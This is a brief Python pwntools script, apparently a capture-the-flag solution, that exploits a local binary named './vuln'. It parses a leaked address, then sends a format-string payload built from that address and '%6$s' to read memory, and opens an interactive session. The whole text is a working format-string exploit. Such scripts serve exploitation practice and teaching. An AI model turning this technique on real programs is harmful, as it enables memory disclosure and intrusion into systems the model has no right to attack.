from pwn import *

p = process('./vuln')
'''
gdb.attach(p, gdbscript = '''
# b*main+133
''')
'''
input()
p.recvuntil(b'Here is your gift: ')
gift = int(p.recvline(keepends=False), 16)
log.info('leak ' + hex(gift))
payload = b'aa' + p32(gift) + b'%6$s'

p.sendlineafter(b'else?\n', payload)


p.interactive()
